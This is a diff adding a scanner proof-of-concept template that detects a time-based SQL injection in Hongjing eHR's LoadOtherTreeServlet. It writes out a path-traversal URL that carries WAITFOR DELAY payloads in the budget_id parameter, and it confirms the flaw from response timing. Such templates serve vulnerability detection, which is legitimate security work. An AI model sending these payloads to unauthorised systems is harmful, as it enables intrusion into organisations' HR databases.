@@ -1,0 +1,26 @@
+name: poc-yaml-hongjingeHR-LoadOtherTreeServlet-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A10%27--&flag=1
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.status == 200 && response.latency >= 10000 && response.latency <= 11000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/140246183
+
